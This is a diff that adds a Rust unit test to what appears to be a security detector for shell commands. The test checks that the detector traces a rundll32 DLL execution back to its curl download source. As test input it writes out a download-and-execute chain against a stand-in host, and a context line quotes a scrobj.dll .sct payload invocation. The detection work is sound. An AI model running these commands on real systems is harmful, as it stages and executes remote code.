@@ -8980,6 +8980,27 @@ rundll32.exe scrobj.dll,GenerateTypeLib payload.sct"#,
     }
 
     #[test]
+    fn rundll32_basename_dll_resolves_full_path_download_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\stage.dll https://rundll32-basename.example/stage.dll"#,
+            &mut env,
+        );
+        interpret_line("rundll32 stage.dll,EntryPoint", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { url: Some(url), .. }
+                        if url == "https://rundll32-basename.example/stage.dll"
+                )
+            }),
+            "rundll32 basename DLL did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn copy_system32_tracked() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
